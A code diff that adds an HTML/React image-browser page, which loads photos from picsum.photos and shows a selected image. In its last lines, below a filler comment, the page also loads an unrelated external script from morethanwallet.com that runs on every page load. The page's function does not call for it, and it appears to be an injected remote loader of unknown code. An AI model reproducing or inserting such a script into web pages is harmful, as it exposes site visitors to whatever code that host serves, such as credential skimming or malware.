@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Image Browser</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+    <style>
+        /* Add custom styles here */
+        .thumbnail {
+            width: 100px;
+            height: 100px;
+            cursor: pointer;
+            margin: 5px;
+            display: inline-block; /* Make thumbnails inline elements */
+            border-radius: 5px;
+        }
+
+        /* New style for the thumbnail container */
+        .thumbnail-container {
+            text-align: center; /* Center thumbnails horizontally */
+            max-width: 700px; /* Set a maximum width for the container */
+            margin: 0 auto; /* Center the container horizontally */
+        }
+        .thumbnail-row {/*ADDADA*/
+            display: flex;
+            justify-content: space-between;
+        }
+        .thumbnail:hover {
+            transform: scale(1.1);
+        }
+        .selected-image-separator {
+            border-top: 2px solid #333; /* Add a 2px solid line above the selected image */
+            margin: 10px 0; /* Add space above and below the line */
+        }
+
+        .selected-image-container {
+            text-align: center; /* Center image horizontally */
+            margin-top: 20px; /* Add some space above the selected image */
+        }
+
+        .selected-image-container img {
+            max-width: 500px; /* Maximum width for the selected image */
+            max-height: 80vh; /* Maximum height to ensure it fits in most screens */
+            margin-top: 20px; /* Space above the image */
+            border-radius: 15px;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center content vertically in a column */
+            margin: 0;
+            padding: 0;
+        }
+
+        h1, h2 {
+            text-align: center; /* Centering headers */
+        }
+    </style>
+</head>
+<body>
+
+<div id="app"></div>
+
+<script type="text/babel">
+    class ImageBrowserApp extends React.Component {
+        constructor(props) {
+            super(props);
+            this.state = {
+                images: [],
+                selectedImage: null
+            };
+        }
+
+        componentDidMount() {
+            const limit = 15; // Limit the number of pictures to fetch
+            fetch('https://picsum.photos/v2/list?limit=' + limit)
+                .then(response => response.json())
+                .then(data => {
+                    const images = data.map(item => ({
+                        thumbnail: `https://picsum.photos/100/100?image=${item.id}`,
+                        full: `https://picsum.photos/${item.width}/${item.height}?image=${item.id}`
+                    }));
+                    this.setState({ images });
+                })
+                .catch(error => console.error('Error fetching images:', error));
+        }
+
+        selectImage = (imageUrl) => {
+            this.setState({ selectedImage: imageUrl });
+        }
+
+        render() {
+            return (
+                <div>
+                    <h1>Image Browser</h1>
+                    <div className="thumbnail-container">
+                        {/* Thumbnails */}
+                        {this.state.images.map(image => (
+                            <img key={image.thumbnail} src={image.thumbnail} className="thumbnail" onClick={() => this.selectImage(image.full)} />
+                        ))}
+                    </div>
+                    {this.state.selectedImage && (
+                        <div>
+                            <div className="selected-image-separator"></div>
+                            <div className="selected-image-container">
+                                {/* Selected Image */}
+                                <h2>Selected Image</h2>
+                                <img src={this.state.selectedImage} alt="Selected Image" />
+                            </div>
+                        </div>
+                    )}
+                </div>
+            );
+        }
+    }
+    // bla bla
+    ReactDOM.render(<ImageBrowserApp />, document.getElementById('app'));
+</script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
